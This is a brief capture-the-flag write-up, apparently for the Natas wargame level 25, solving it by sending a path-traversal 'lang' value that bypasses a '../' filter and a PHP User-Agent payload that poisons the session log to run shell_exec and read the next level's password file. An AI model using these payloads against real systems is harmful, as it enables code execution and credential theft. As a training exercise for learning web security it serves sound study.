![image](https://github.com/user-attachments/assets/cfb316b3-fb28-4a94-ad61-7cf469fa8e87)


solution:

fire up the burp, capture the request.
lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_0jcdrhk2m2u5l6sfbqo0gi00r5.log 
send this query. 0jcdrhk2m2u5l6sfbqo0gi00r5 is my PHPSESSID cookie.
Also change the user agent to <?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
send this request.
